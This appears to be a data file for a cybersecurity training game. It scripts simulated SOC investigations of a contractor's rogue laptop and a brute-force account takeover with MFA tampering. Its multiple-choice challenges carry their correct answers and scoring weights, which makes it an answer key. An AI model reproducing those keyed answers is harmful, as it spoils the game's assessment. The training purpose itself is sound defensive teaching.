          '64 bytes from 192.168.1.57: icmp_seq=2 ttl=64 time=0.7 ms',
          '--- 192.168.1.57 ping statistics: 0% packet loss ---',
        ],
        reveals: ['ev_host_live'],
        observation: 'It responds instantly — this is a real, powered-on device sitting on the LAN right now.',
        question: 'It is live and active. What is it actually running?',
        next: 'scan just this host for open services — type  nmap 192.168.1.57',
      },
      {
        id: 'nmap_host',
        match: ['nmap 192.168.1.57', 'nmap 57'],
        help: 'scan the unknown host for open services',
        core: true,
        output: [
          { t: 'Nmap scan report — 192.168.1.57', c: 'head' },
          '  PORT     STATE  SERVICE',
          '  22/tcp   open   ssh        (remote login)',
          '  445/tcp  open   smb        (file sharing)',
          '  8080/tcp open   http-proxy',
          '  OS guess: generic Linux laptop',
        ],
        reveals: ['ev_open_services'],
        observation: 'The unknown device is exposing remote-login and file-sharing services — not a passive gadget.',
        question: 'Why would an unmanaged device be offering file sharing on the office network?',
        next: 'see when and how it joined — type  cat dhcp_leases.txt',
      },
      {
        id: 'dhcp_leases',
        match: ['cat dhcp_leases.txt', 'cat dhcp_leases', 'less dhcp_leases.txt'],
        help: 'read recent DHCP address assignments',
        output: [
          { t: 'dhcp_leases.txt — recent address handouts', c: 'head' },
          '  192.168.1.57   mac a4:83:e7:1c:9b:22   host "DEMIR-LAPTOP"   leased 2 days ago',
          '  mac vendor lookup: a4:83:e7  →  Apple, Inc. (personal-class hardware)',
        ],
        reveals: ['ev_lease'],
        observation: 'The lease names the device "DEMIR-LAPTOP" — a personal laptop that joined just two days ago.',
        question: 'A personal laptop named after someone — who, and were they allowed to plug in?',
        next: 'search the network notes for that address — type  grep 192.168.1.57 network_notes.txt',
      },
      {
        id: 'grep_notes',
        match: ['grep 192.168.1.57 network_notes.txt', 'grep 192.168.1.57', 'grep 57 network_notes.txt'],
        help: 'search the network notes for the unknown host',
        output: [
          'network_notes.txt:  "1.57 showed up this week — someone said it'+"'"+'s a contractor'+"'"+'s own laptop?"',
          'network_notes.txt:  "not ticketed, not imaged by IT. flagged for follow-up."',
        ],
        reveals: ['ev_notes_contractor'],
        observation: 'An informal note already suspected 1.57 is a contractor'+"'"+'s personal laptop — never ticketed or managed by IT.',
        question: 'Which contractor, and is this the same one from the data-handling review?',
        next: 'check the contractor assignments — type  cat contractor_assignments.txt',
      },
      {
        id: 'contractor_assignments',
        match: ['cat contractor_assignments.txt', 'cat contractor_assignments', 'less contractor_assignments.txt'],
        help: 'read the active contractor assignments',
        core: true,
        output: [
          { t: 'contractor_assignments.txt — active vendors', c: 'head' },
          '  ext-contractor-07   J. Demir   Logistics integration   device policy: COMPANY-ISSUED ONLY',
          '  # Personal devices are NOT permitted on internal segments. Vendors use the guest network.',
        ],
        reveals: ['ev_contractor_device'],
        observation: 'The laptop belongs to J. Demir — the same contractor account flagged in the data-handling case — and personal devices are barred from internal segments.',
        question: 'The same contractor, now with unmanaged hardware on the internal network — coincidence?',
        next: 'see where on the network it actually sits — type  cat network_diagram.txt',
      },
      {
        id: 'network_diagram',
        match: ['cat network_diagram.txt', 'cat network_diagram', 'less network_diagram.txt'],
        help: 'read the network segment diagram',
        output: [
          { t: 'network_diagram.txt — segments', c: 'head' },
          '  GUEST  192.168.9.0/24   visitors, contractors (isolated, no internal access)',
          '  CORP   192.168.1.0/24   staff + finance + file server   ← 192.168.1.57 is HERE',
          '  # Contractor devices belong on GUEST. 1.57 is on CORP, beside the finance laptop.',
        ],
        reveals: ['ev_segment'],
        observation: 'The device is on the CORP segment next to Finance — exactly where a contractor laptop should never be.',
        question: 'On the guest network it could reach nothing internal. On CORP, what can it reach?',
        next: 'check policy for unknown devices — type  cat security_baseline.txt',
      },
      {
        id: 'security_baseline',
        match: ['cat security_baseline.txt', 'cat security_baseline', 'less security_baseline.txt'],
        help: 'read the device security baseline policy',
        output: [
          { t: 'security_baseline.txt — device policy', c: 'head' },
          '  - Only inventoried, IT-managed devices may join the CORP segment.',
          '  - Unknown or personal devices must be disconnected and escalated, not left to "monitor".',
        ],
        reveals: ['ev_policy'],
        observation: 'Policy is explicit: an unknown device on CORP is disconnected and escalated — not watched.',
        question: 'You now have the rule and the violation. What is the correct response?',
        next: 'check what the device has been doing — type  tail network_events.log',
      },
      {
        id: 'network_events',
        match: ['tail network_events.log', 'cat network_events.log', 'less network_events.log'],
        help: 'read the most recent network events',
        core: true,
        output: [
          { t: 'network_events.log — last entries', c: 'head' },
          '  192.168.1.57 → 192.168.1.10:445  connection attempt (file server)  DENIED',
          '  192.168.1.57 → 192.168.1.20:445  connection attempt (finance laptop)  DENIED',
          '  192.168.1.57 → 192.168.1.10:445  retry  DENIED',
        ],
        reveals: ['ev_probe'],
        observation: 'The unknown laptop has been repeatedly reaching for the finance file share — not idle, actively probing.',
        question: 'A barred personal device probing finance shares — does that wait, or does it move now?',
        next: 'you have the full picture — type  decide  to choose your response',
      },
    ],

    evidence: [
      {
        id: 'ev_subnet', label: 'You and every office device share one subnet (192.168.1.0/24).',
        qualityWeight: 1, source: 'ip addr',
        layers: {
          beginner: {
            summary: 'Your computer and all the office devices are on the same shared network.',
            why: 'Devices on the same network can usually reach each other directly.',
            prompt: 'If a stranger'+"'"+'s laptop joined this same network, what might it be able to reach?',
          },
          analyst: 'Local host 192.168.1.34/24; all office assets share the 192.168.1.0/24 broadcast domain.',
          technical: 'eth0 inet 192.168.1.34/24, brd 192.168.1.255 — flat L2 segment, intra-subnet reachability by default.',
          terms: ['network', 'subnet', 'ipAddress'],
        },
      },
      {
        id: 'ev_unknown_host', label: 'An extra host (192.168.1.57) is online with no recognizable name.',
        qualityWeight: 2, source: 'nmap 192.168.1.0/24',
        layers: {
          beginner: {
            summary: 'A scan of the network found one extra device that does not have a normal name.',
            why: 'Company devices have known names; an unnamed one nobody recognizes stands out.',
            prompt: 'Four devices you can name and one you cannot — which deserves attention?',
          },
          analyst: 'Subnet sweep returns 5 live hosts; 192.168.1.57 has no reverse DNS and no asset mapping.',
          technical: 'nmap -sn 192.168.1.0/24 — 192.168.1.57 up, no PTR record, unmatched to inventory.',
          terms: ['network', 'device'],
        },
      },
      {
        id: 'ev_not_in_inventory', label: '192.168.1.57 is NOT in the approved asset inventory.',
        qualityWeight: 3, source: 'asset_inventory.txt',
        layers: {
          beginner: {
            summary: 'The official list of allowed devices does not include 192.168.1.57.',
            why: 'If a device is on the network but not on the approved list, nobody signed off on it being there.',
            prompt: 'A device nobody approved is connected — mistake, or something worse?',
          },
          analyst: 'Asset inventory enumerates .1/.10/.20/.34; 192.168.1.57 is unaccounted for — an unmanaged asset.',
          technical: 'asset_inventory.txt baseline excludes 192.168.1.57; device is non-inventoried / unauthorized.',
          terms: ['device', 'ipAddress'],
        },
      },
      {
        id: 'ev_host_live', label: 'The unknown host is powered on and responding right now.',
        qualityWeight: 1, source: 'ping 192.168.1.57',
        layers: {
          beginner: {
            summary: 'The unknown device answers immediately — it is switched on and active.',
            why: 'This is not a stale record; it is a real device on the network at this moment.',
            prompt: 'It is live. The next question is — what is it running?',
          },
          analyst: 'ICMP echo to 192.168.1.57 — 0% loss, sub-ms RTT; host active on-segment.',
          technical: 'ping 192.168.1.57 — replies ttl=64, 0% packet loss; device live.',
          terms: ['device'],
        },
      },
      {
        id: 'ev_open_services', label: 'The unknown device exposes remote-login and file-sharing services.',
        qualityWeight: 2, source: 'nmap 192.168.1.57',
        layers: {
          beginner: {
            summary: 'The device is offering ways to log in remotely and share files.',
            why: 'An unmanaged device offering these services is a door an attacker could push on.',
            prompt: 'Why would a personal laptop be offering file sharing on the office network?',
          },
          analyst: 'Host scan: 22/ssh, 445/smb, 8080/http open — interactive + file-share exposure on an unmanaged host.',
          technical: 'nmap 192.168.1.57 — open 22 (ssh), 445 (smb), 8080 (http-proxy); unmanaged endpoint exposing services.',
          terms: ['service', 'portScan'],
        },
      },
      {
        id: 'ev_lease', label: 'The device is a personal laptop ("DEMIR-LAPTOP") that joined 2 days ago.',
        qualityWeight: 2, source: 'dhcp_leases.txt',
        layers: {
          beginner: {
            summary: 'Records show the device is a personal laptop that connected just two days ago.',
            why: 'A brand-new personal device on the company network, named after a person, is worth tracing.',
            prompt: 'Whose laptop is it, and were they allowed to plug it in here?',
          },
          analyst: 'DHCP lease: 192.168.1.57 → MAC a4:83:e7:1c:9b:22 (Apple), hostname DEMIR-LAPTOP, age ~48h.',
          technical: 'dhcp_leases.txt — recent lease, OUI a4:83:e7 = Apple; hostname DEMIR-LAPTOP; personal-class device.',
          terms: ['device'],
        },
      },
      {
        id: 'ev_notes_contractor', label: 'Network notes already suspected 1.57 is a contractor'+"'"+'s personal laptop.',
        qualityWeight: 2, source: 'network_notes.txt',
        layers: {
          beginner: {
            summary: 'Someone had already jotted down that 1.57 looked like a contractor'+"'"+'s own laptop.',
            why: 'It was noticed but never ticketed or checked by IT — it slipped through.',
            prompt: 'Which contractor — and is it the same one from the earlier review?',
          },
          analyst: 'Informal note ties 192.168.1.57 to a contractor-owned device; never ticketed or IT-imaged.',
          technical: 'network_notes.txt — unmanaged contractor device suspicion, no change ticket, flagged-for-follow-up only.',
          terms: [],
        },
      },
      {
        id: 'ev_contractor_device', label: 'The laptop belongs to contractor J. Demir; personal devices are barred from internal segments.',
        qualityWeight: 3, source: 'contractor_assignments.txt', setFlag: 'contractorDeviceLinked',
        layers: {
          beginner: {
            summary: 'The laptop belongs to contractor J. Demir — and contractors are not allowed to use personal devices here.',
            why: 'It is the same contractor from the data-handling case, now with an unapproved device on the internal network.',
            prompt: 'The same contractor again, this time with unmanaged hardware — coincidence?',
          },
          analyst: 'Device owner = J. Demir (ext-contractor-07); policy = company-issued only, vendors on guest segment.',
          technical: 'contractor_assignments.txt — ext-contractor-07 (J. Demir), device-policy COMPANY-ISSUED-ONLY; personal device on CORP = violation.',
          terms: ['device'],
        },
        reflection: {
          title: 'REVIEW THE UNAPPROVED DEVICE',
          prompt: 'What concerns you about this device? (Tick anything that stands out.)',
          concerns: [
            'It is not on the approved inventory',
            'It belongs to an outside contractor, on personal hardware',
            'It is on the internal finance segment, not the guest network',
            'It has been reaching for the finance file share',
            'This looks like a harmless mistake',
            'I need more information before deciding',
          ],
          judgmentPrompt: 'Based on what you found, how would you judge this device?',
          feedback: 'There is no single right answer — analysts reason from what they see. WHO owns it, WHERE it sits, and WHAT it is reaching for together tell you how much this matters.',
        },
      },
      {
        id: 'ev_segment', label: 'The device sits on the internal CORP segment beside Finance, not on guest.',
        qualityWeight: 3, source: 'network_diagram.txt',
        layers: {
          beginner: {
            summary: 'The device is plugged into the internal part of the network, right next to the finance computer.',
            why: 'Contractor devices are supposed to be on a separate guest network with no internal access.',
            prompt: 'On guest it could reach nothing internal. On this segment, what can it reach?',
          },
          analyst: '192.168.1.57 resides on CORP (192.168.1.0/24) adjacent to Finance, not the isolated GUEST segment.',
          technical: 'network_diagram.txt — CORP vs GUEST segmentation; 192.168.1.57 misplaced on CORP, bypassing guest isolation.',
          terms: ['network', 'subnet'],
        },
      },
      {
        id: 'ev_policy', label: 'Policy: unknown devices on CORP must be disconnected and escalated, not monitored.',
        qualityWeight: 1, source: 'security_baseline.txt',
        layers: {
          beginner: {
            summary: 'The rules say an unknown device on the internal network must be removed and reported.',
            why: 'Knowing the policy turns a hunch into a clear, defensible action.',
            prompt: 'You have the rule and the violation — what is the correct response?',
          },
          analyst: 'Baseline mandates disconnect + escalate for non-inventoried CORP devices; "monitor" is non-compliant.',
          technical: 'security_baseline.txt — unmanaged CORP endpoints: quarantine/disconnect + escalate per policy.',
          terms: [],
        },
      },
      {
        id: 'ev_probe', label: 'The device has repeatedly tried to reach the finance file share.',
        qualityWeight: 3, source: 'network_events.log',
        layers: {
          beginner: {
            summary: 'The unknown laptop keeps trying to connect to the finance file-sharing service.',
            why: 'A device that should not be here, repeatedly reaching for finance data, is actively probing — not idle.',
            prompt: 'A barred device probing finance shares — does that wait, or does it get handled now?',
          },
          analyst: 'Repeated 192.168.1.57 → :445 attempts against fileserver + finance laptop, all denied — active enumeration.',
          technical: 'network_events.log — 192.168.1.57 SMB (445) connection attempts to .10/.20, DENIED, retried; lateral-probe behavior.',
          terms: ['service'],
        },
      },
    ],

    actions: [
      {
        id: 'recommend_disconnect',
        type: 'recommendation',
        label: 'Recommend Disconnect',
        summary: 'Recommend the unapproved device be disconnected and quarantined from the network.',
        outcomeSub: 'You recommended disconnecting the unapproved device.',
        deltas: { securityPosture: 18, complianceExposure: -12, businessContinuity: -4, executiveTrust: 8, careerReputation: 10 },
        setFlags: ['rogueDeviceContained'],
        deniedNote: 'Leadership held off on disconnecting — they want firmer evidence the device is unauthorized first.',
        consequence: {
          immediate: ['Network team quarantines 192.168.1.57; its probing of the finance share stops.'],
          business: ['The contractor loses informal network access until properly provisioned on guest. Minor friction, no exposure.'],
          future: ['A clean containment record strengthens your later recommendations.'],
        },
      },
      {
        id: 'monitor',
        type: 'direct',
        label: 'Monitor',
        summary: 'Leave the device online and keep watching its traffic for now.',
        outcomeSub: 'You chose to monitor the device rather than remove it.',
        deltas: { securityPosture: -6, complianceExposure: 8, businessContinuity: 2, careerReputation: -4, executiveTrust: -2 },
        setFlags: ['rogueDeviceActive'],
        consequence: {
          immediate: ['The unapproved device stays on the internal segment, still reaching for finance shares.'],
          business: ['Policy says unknown CORP devices are disconnected, not watched — this leaves exposure open.'],
          future: ['An uncontained device on record raises scrutiny on later missions.'],
        },
      },
      {
        id: 'escalate',
        type: 'recommendation',
        label: 'Escalate',
        summary: 'Escalate the unknown device to your SOC Lead with your findings.',
        outcomeSub: 'You escalated the unknown device to leadership.',
        deltas: { executiveTrust: 10, careerReputation: 8, securityPosture: 4, complianceExposure: -6, businessContinuity: -2 },
        setFlags: [],
        deniedNote: 'Leadership sent it back — they want a clear recommendation, not just a hand-off.',
        consequence: {
          immediate: ['Escalated to SOC Lead with the asset-discovery findings and the contractor link.'],
          business: ['Senior review engaged; the containment decision sits with the right authority.'],
          future: ['Escalating with solid evidence builds trust for bigger calls later.'],
        },
      },
      {
        id: 'continue_investigation',
        type: 'direct',
        label: 'Continue Investigation',
        summary: 'Hold off on a response and keep gathering information.',
        outcomeSub: 'You chose to continue investigating before acting.',
        deltas: { securityPosture: -2, businessContinuity: 1, careerReputation: -2, complianceExposure: 3 },
        setFlags: ['rogueDeviceActive'],
        consequence: {
          immediate: ['No action taken yet; the device remains online while you gather more.'],
          business: ['Caution is fine early, but the evidence already supports acting — delay leaves exposure open.'],
          future: ['Slow-walking a clear finding is noted as indecision.'],
        },
      },
      {
        id: 'ignore',
        type: 'direct',
        label: 'Ignore',
        summary: 'Treat it as a false alarm and close the alert.',
        outcomeSub: 'You dismissed the alert.',
        deltas: { securityPosture: -20, complianceExposure: 25, businessContinuity: 3, careerReputation: -15, executiveTrust: -15 },
        setFlags: ['rogueDeviceActive'],
        consequence: {
          immediate: ['The unapproved contractor device stays on the finance segment, unmonitored.'],
          business: ['An unmanaged device with file-share access to finance is left in place — a standing breach risk.'],
          future: ['Dismissing a real finding badly damages trust in your judgment.'],
        },
      },
    ],

    lockedActions: [
      {
        id: 'reconfigure_firewall',
        label: 'Reconfigure Firewall / Network ACLs',
        reason: 'Cybersecurity Interns cannot push firewall or network access-control changes. That is a Network Administrator action.',
        alternativeRecommendationId: 'rec_network_isolation',
      },
      {
        id: 'seize_device',
        label: 'Physically Seize the Device',
        reason: 'Interns cannot seize hardware. Physical confiscation requires IT and HR involvement.',
        alternativeRecommendationId: 'rec_device_review',
      },
    ],

    recommendations: {
      rec_network_isolation: {
        label: 'Network Isolation Request',
        deltas: { securityPosture: 12, complianceExposure: -8, careerReputation: 6, businessContinuity: -2 },
        setFlags: ['rogueDeviceContained'],
        deniedNote: 'Networking declined to isolate the segment without a formal change request.',
        consequence: {
          immediate: ['Requested the network team isolate 192.168.1.57 from the internal segment.'],
          business: ['Contractor device cut off from finance resources pending proper provisioning.'],
          future: ['Tighter segmentation reduces exposure on later missions.'],
        },
      },
      rec_device_review: {
        label: 'Device Security Review',
        deltas: { securityPosture: 8, executiveTrust: 5, careerReputation: 6, complianceExposure: -5 },
        setFlags: [],
        deniedNote: 'Leadership deferred the device review for now.',
        consequence: {
          immediate: ['Requested IT and HR review the contractor'+"'"+'s device and access.'],
          business: ['Contractor device policy gaps flagged to the right owners.'],
          future: ['A documented review keeps the contractor on the radar for later missions.'],
        },
      },
    },
  },

  /* ================================================================== *
   * MISSION 3 — Investigate Suspicious Authentication Activity (COMMAND-MODEL)
   * Read simplified auth logs, recognize the brute-force → success → MFA-off
   * compromise pattern, identify WHICH account was taken over, and recommend
   * a response. Ties back to Mission 1 (A. Okafor, Finance) and the recurring
   * contractor. Behavior before terminology throughout.
   * ================================================================== */
  'mission-003': {
    id: 'mission-003',
    investigationFeed: true, // Active Investigation Feed (data-driven from discoveryChallenges).
    /* Two-step Analyst Judgment Engine — see Mission 1 for the schema. Authored on
     * existing evidence ids; boardMilestones auto-open the network map once each. */
    caseFileNotebook: true,
    // Pacing beat (shared with Mission 1; see reviewGateMode): show a "read what
    // came up, then continue" step before Sarah's graded call so the just-printed
    // terminal output stays visible. Presentation/sequencing only — never grades.
    reviewBeforeCall: true,
    boardMilestones: ['ev_failures', 'ev_impossible', 'ev_changes'],
    discoveryChallenges: [
      {
        id: 'ch_m3_failures', evidenceId: 'ev_failures', short: 'Login pattern', weight: 1,
        observation: {
          prompt: 'You open the auth logs. What stands out about the login pattern?',
          correct: 'a',
          options: [
            { id: 'a', label: '47 failed logins in 7 minutes from one external address',
              feedback: '"Yes — a tight burst of failures from a single source is the signature of automated guessing." — Sarah Reyes' },
            { id: 'b', label: 'The logs are recorded in UTC',
              feedback: '"Time zone is just bookkeeping. The standout is the rapid burst of failed attempts." — Sarah Reyes' },
            { id: 'c', label: 'The account has a long username',
              feedback: '"Username length is irrelevant. Focus on the 47 failures in 7 minutes." — Sarah Reyes' },
          ],
        },
        justification: {
          prompt: 'Why does that burst of failures matter?',
          correct: 'a',
          options: [
            { id: 'a', label: 'It is automated password guessing — a brute-force attempt',
              feedback: '"Exactly — that volume and speed is not a human mistyping. It is a credential attack." — Sarah Reyes' },
            { id: 'b', label: 'The user simply forgot their password',
              feedback: '"A forgetful user does not generate 47 tries in 7 minutes from an external host. This is automated." — Sarah Reyes' },
            { id: 'c', label: 'The login page was running slowly',
              feedback: '"Performance does not create failed-login bursts like this. It is a brute-force pattern." — Sarah Reyes' },
          ],
        },
      },
      {
        id: 'ch_m3_impossible', evidenceId: 'ev_impossible', short: 'Session geography', weight: 1,
        observation: {
          prompt: 'You map the sessions. What stands out about their geography?',
          correct: 'a',
          options: [
            { id: 'a', label: 'Two sessions thousands of km apart, only minutes apart',
              feedback: '"Right — that is textbook impossible travel. One person cannot be in both places." — Sarah Reyes' },
            { id: 'b', label: 'One session used a mobile browser',
              feedback: '"Device type is a detail. The standout is two locations too far apart to be the same person." — Sarah Reyes' },
            { id: 'c', label: 'The sessions each lasted a few minutes',
              feedback: '"Session length is minor. The impossibility is the distance covered in the time between them." — Sarah Reyes' },
          ],
        },
        justification: {
          prompt: 'Why does impossible travel matter?',
          correct: 'a',
          options: [
            { id: 'a', label: 'It proves a second party is using the account, not the real owner',
              feedback: '"Exactly — physics rules out one user. Someone else is logged in alongside the owner." — Sarah Reyes' },
            { id: 'b', label: 'The owner was probably just travelling',
              feedback: '"No amount of travel covers thousands of km in minutes. This is a second actor." — Sarah Reyes' },
            { id: 'c', label: 'A VPN makes location data meaningless',
              feedback: '"A VPN can shift one location, not create two simultaneous impossible ones. This is account misuse." — Sarah Reyes' },
          ],
        },
      },
      {
        id: 'ch_m3_changes', evidenceId: 'ev_changes', short: 'Post-login actions', weight: 2,
        observation: {
          prompt: 'You review what happened right after the successful login. What stands out?',
          correct: 'a',
          options: [
            { id: 'a', label: 'MFA was disabled, mail forwarding added, and the password changed',
              feedback: '"That is the tell — those are persistence and lock-out moves, not normal account use." — Sarah Reyes' },
            { id: 'b', label: 'The user changed their profile photo',
              feedback: '"Cosmetic changes do not matter. The standout is MFA off, forwarding on, password reset." — Sarah Reyes' },
            { id: 'c', label: 'The session sat idle for a while',
              feedback: '"Idle time is not the signal. The security-control changes are." — Sarah Reyes' },
          ],
        },
        justification: {
          prompt: 'How should you judge these post-login actions?',
          correct: 'malicious',
          options: [
            { id: 'malicious', label: 'Malicious — the attacker is entrenching access; treat it as a confirmed compromise',
              feedback: '"Agreed. Disabling MFA and adding forwarding is deliberate entrenchment — this is a confirmed takeover." — Sarah Reyes' },
            { id: 'suspicious', label: 'Suspicious — worth a closer look later',
              feedback: '"This is past suspicious. Active control-tampering after an impossible login is a confirmed compromise — act now." — Sarah Reyes' },
            { id: 'benign', label: 'Benign — users tweak their settings all the time',
              feedback: '"Not like this. Turning off MFA right after a brute-force success is an attacker covering their tracks." — Sarah Reyes' },
          ],
        },
      },
    ],
    opId: 'OPS-2026-003',
    severity: 'HIGH',
    region: 'NA-EAST REGION',
    title: 'Investigate Suspicious Authentication Activity',
    threatClass: 'Authentication Security & Account Compromise',
    priority: 'P2 — HIGH',
    promptLabel: 'intern@cybercorp:~/authlogs$',
    carryFlags: [
      { key: 'credentialRiskHigh',           label: 'Confirmed credential-compromise incident on record' },
      { key: 'contractorAccountCompromised', label: 'Compromise tied to the recurring contractor' },
      { key: 'mfaRecommended',               label: 'MFA enforcement recommended' },
    ],
    supervisorMemory: [
      { when: { allOf: ['rogueDeviceActive'] }, tone: 'bad',
        text: "That rogue device you left on the network last case is still live — exactly the kind of quiet way in that leads to a takeover like this. Stay sharp." },
      { when: { allOf: ['rogueDeviceContained'] }, tone: 'good',
        text: "Good thing you pulled that rogue device off the network last case. One less open door for whoever's behind this." },
      { when: { allOf: ['contractorDeviceLinked'] }, tone: 'neutral',
        text: "You already tied a device to that contractor. If the same name shows up in these auth logs, you'll know exactly what you're looking at." },
      { when: { allOf: ['sensitiveDataExposed'] }, tone: 'warn',
        text: "Leadership hasn't forgotten the data that left on your first case. A clean, well-evidenced call here rebuilds trust." },
    ],
    notebook: {
      facts: [
        { label: 'A burst of failed logins was immediately followed by a successful one.', confirmedBy: ['ev_failures', 'ev_success'] },
        { label: 'The successful login came from a location the owner never uses.', confirmedBy: ['ev_location', 'ev_impossible'] },
        { label: 'Multi-factor authentication was switched off right after the login.', confirmedBy: ['ev_mfa_off', 'ev_changes'] },
        { label: 'The activity ties back to the recurring contractor.', confirmedBy: ['ev_contractor_tie'] },
      ],
      hypotheses: [
        { label: 'This is a brute-force / credential-stuffing takeover, not a user mistake.', triggeredBy: ['ev_failures', 'ev_overview'] },
        { label: 'The attacker is operating from a location the real owner never uses.', triggeredBy: ['ev_location', 'ev_impossible'] },
        { label: 'The attacker disabled security controls to keep persistent access.', triggeredBy: ['ev_changes', 'ev_mfa_off'] },
        { label: 'The compromise traces back to the recurring contractor from earlier cases.', triggeredBy: ['ev_contractor_tie'] },
      ],
      unknowns: [
        { label: 'Did a login actually succeed, or were they all blocked?', resolvedBy: ['ev_success'] },
        { label: 'Did the attacker reach sensitive data once inside?', resolvedBy: ['ev_access'] },
        { label: 'Is the legitimate owner now locked out of their own account?', resolvedBy: ['ev_reset'] },
      ],
      recommendations: [
        { label: 'Flag the credential-compromise incident for response.', doneBy: ['credentialRiskHigh'] },
        { label: 'Enforce multi-factor authentication on the account.', doneBy: ['mfaRecommended'] },
        { label: 'Tie the compromise back to the recurring contractor.', doneBy: ['contractorAccountCompromised'] },
      ],
    },
    evidenceEmpty: 'No evidence yet. Use the terminal to read the authentication logs — each command can surface a new finding.',
    risks: [
      { id: 'risk_bruteforce',     label: 'Repeated failed logins indicate password guessing', triggeredBy: ['ev_failures'] },
      { id: 'risk_success_after',  label: 'A login succeeded immediately after the failures', triggeredBy: ['ev_success'] },
      { id: 'risk_foreign_login',  label: 'A successful login came from an unrecognized location', triggeredBy: ['ev_location'] },
      { id: 'risk_mfa_tamper',     label: 'Multi-factor authentication was turned off after the login', triggeredBy: ['ev_mfa_off', 'ev_changes'] },
      { id: 'risk_sensitive_access',label: 'The account accessed sensitive finance data after the login', triggeredBy: ['ev_access'] },
      { id: 'risk_contractor_tie', label: 'The activity ties back to the previously flagged contractor', triggeredBy: ['ev_contractor_tie'] },
    ],
    identify: {
      head: 'YOUR DETERMINATION',
      prompt: 'Which account has been compromised?',
      reviewLabel: 'Compromised account',
      note: 'Determination recorded — this is the account your recommendation will protect.',
      correctId: 'acct_okafor',
      options: [
        { id: 'acct_okafor',  label: 'a.okafor — Finance Controller' },
        { id: 'acct_reyes',   label: 's.reyes — SOC Lead' },
        { id: 'acct_brandt',  label: 'l.brandt — Staff Engineer' },
        { id: 'acct_demir',   label: 'contractor01 — J. Demir (contractor)' },
      ],
    },

    // Reactive identity/auth map — review-only, same engine as mission-002.
    // Nodes/links stay hidden until the terminal surfaces the matching
    // evidence; nothing is persisted or scored. Only the corporate sign-in /
    // alerting service is seeded (genuinely pre-known infrastructure). The
    // targeted account, the external attacker, the brute-force-then-success,
    // the impossible-travel session, the MFA-off state, the password reset /
    // lockout, the sensitive-data access and the contractor tie each appear
    // ONLY once their proving evidence is found — the map never names the
    // culprit or a finding early.
    map: {
      cap: 'IDENTITY & AUTH · SIGN-IN REVIEW — NA-EAST REGION',
      hint: 'Red marks the external source driving the takeover and the assets it reached. Select any node or connection for analyst intel.',
      nodes: {
        authsys: {
          x: 50, y: 10, glyph: '🔐', label: 'auth.cybercorp', sub: 'sign-in & alerting', seed: true, status: 'identified',
          intel: {
            what: 'The corporate sign-in service every account authenticates through — and the system that raised this login alert.',
            technique: 'It is the system under review — auth.log and the failed-login alert both originate here.',
            why: 'It records every login attempt and flags abnormal bursts, so all account activity is reviewed against it.' },
        },
        account: {
          x: 50, y: 40, glyph: '👤', label: 'a.okafor', sub: 'Finance Controller',
          revealBy: 'ev_overview', statusBy: { ev_overview: 'target' }, identifyAs: 'acct_okafor',
          intel: {
            what: 'The Finance Controller account named in the brief — the one the authentication alert fired on.',
            technique: 'Read the authentication log (cat auth.log) to see this account\u2019s failed-then-successful pattern.',
            why: 'It is the account under review; confirming whether it was taken over is the whole point of the case.' },
        },
        attacker: {
          x: 84, y: 20, glyph: '🌐', label: '203.0.113.44', sub: 'external source',
          revealBy: 'ev_overview', status: 'unknown', statusBy: { ev_failures: 'suspicious', ev_success: 'suspicious', ev_contractor_tie: 'suspicious' },
          intel: {
            what: 'The external source address behind this account\u2019s login attempts.',
            technique: 'It is the src on every failed and successful login in auth.log.',
            why: 'One outside address driving dozens of failures then a success is the signature of a credential attack.' },
        },
        homebase: {
          x: 14, y: 26, glyph: '🏢', label: 'London, UK', sub: 'usual session',
          revealBy: 'ev_location', status: 'identified',
          intel: {
            what: 'The account\u2019s usual London location, with a normal session open at the same time as the attack.',
            technique: 'cat login_locations.log — every prior login is London, and a concurrent London session is noted.',
            why: 'A real London session at the moment of a Lagos login proves the two cannot be the same person.' },
        },
        controls: {
          x: 16, y: 60, glyph: '🔑', label: 'MFA + sign-in', sub: 'account security',
          revealBy: 'ev_mfa_off', statusBy: { ev_mfa_off: 'target', ev_changes: 'target', ev_reset: 'target' },
          intel: {
            what: 'This account\u2019s multi-factor protection — now switched OFF.',
            technique: 'cat mfa_status.txt — MFA shows DISABLED; it was ENABLED until 03:21.',
            why: 'With MFA off, only the password is left guarding the account.' },
        },
        lockout: {
          x: 38, y: 78, glyph: '🔒', label: 'password reset', sub: 'owner locked out',
          revealBy: 'ev_reset', statusBy: { ev_reset: 'target' },
          intel: {
            what: 'The account password, reset from the attacker\u2019s address so the real owner is locked out.',
            technique: 'grep password_reset user_access.log — a reset issued from 203.0.113.44 (Lagos).',
            why: 'Resetting the password is how the intruder keeps control and stops the owner regaining access.' },
        },
        finance_data: {
          x: 68, y: 82, glyph: '💰', label: 'finance_share', sub: 'payroll · payments',
          revealBy: 'ev_access', statusBy: { ev_access: 'target' },
          intel: {
            what: 'The Finance share holding payroll and customer-payment data the compromised account opened.',
            technique: 'cat user_access.log — payroll and customer_payments opened, q3_compensation.csv downloaded.',
            why: 'It is the sensitive data now exposed through the takeover — the real impact of the incident.' },
        },
        contractor: {
          x: 86, y: 60, glyph: '👷', label: 'ext-contractor-07', sub: 'J. Demir (disabled)',
          revealBy: 'ev_contractor_tie', statusBy: { ev_contractor_tie: 'suspicious' }, identifyAs: 'acct_demir',
          intel: {
            what: 'The recurring vendor (J. Demir / ext-contractor-07) whose own account was already disabled.',
            technique: 'cat contractor_activity.log — the attacking address maps to this contractor\u2019s prior sessions.',
            why: 'A blocked contractor pivoting to a stolen Finance login turns a one-off into a continuing campaign.' },
        },
      },
      links: [
        { a: 'account', b: 'authsys', revealBy: 'ev_overview',
          intel: {
            what: 'This account authenticates through the corporate sign-in service, where its login events are logged.',
            technique: 'cat auth.log — the account\u2019s login attempts are recorded here.',
            why: 'It is the normal login path; the attack shows up as abnormal events along this same path.' } },
        { a: 'attacker', b: 'account', revealBy: 'ev_overview', danger: true,
          intel: {
            what: 'Repeated failed logins followed by a success against this account, all from one external address.',
            technique: 'cat auth.log; grep failed auth.log and grep successful auth.log quantify the burst and the success.',
            why: 'A wave of failures ending in a success is a brute-force that worked — the moment of takeover.' } },
        { a: 'homebase', b: 'account', revealBy: 'ev_location',
          intel: {
            what: 'A legitimate London session for the same account, open at the time of the foreign login.',
            technique: 'cat login_locations.log — usual London logins plus a concurrent London session.',
            why: 'A real London session running while a login arrives from a never-used place means the foreign login is someone else.' } },
        { a: 'attacker', b: 'controls', revealBy: 'ev_changes', danger: true,
          intel: {
            what: 'Right after logging in, the intruder disabled MFA, added mail forwarding and changed the password.',
            technique: 'cat account_changes.log — MFA off (03:21), mail-forward added, password changed, all from 203.0.113.44.',
